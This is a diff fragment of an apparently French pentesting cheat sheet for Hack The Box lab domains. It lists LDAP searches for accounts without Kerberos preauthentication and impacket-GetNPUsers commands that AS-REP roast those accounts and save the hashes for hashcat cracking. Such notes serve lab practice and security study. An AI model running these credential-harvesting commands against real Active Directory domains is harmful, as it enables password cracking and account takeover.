@@ -26,12 +26,15 @@ netexec ldap sequel.htb -u '' -p '' --query "(userAccountControl:1.2.840.113556.
 ldapsearch -x -H ldap://<DC_IP> -b "DC=sequel,DC=htb" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName userAccountControl
 ldapsearch -x -H ldap://<DC_IP> -D "" -w "" -b "DC=sequel,DC=htb" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName userAccountControl
 
-# Obtenir la liste des users mais que tu n'as **aucun mot de passe**,
+# Obtenir la liste des users meme quand tu n'as **aucun mot de passe**,
 impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass
+
 # Mettre dans un fichier au format pour hashcat
 impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile valid_users.txt -dc-ip 10.129.41.79 -format hashcat -outputfile hashes.aspreroast -no-pass
+
 # Obtenir les comptes ayant retourné un AS-REP
 impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -request
+
 # la sortie intéressante
 $krb5asrep$23$user@DOMAIN:...
 
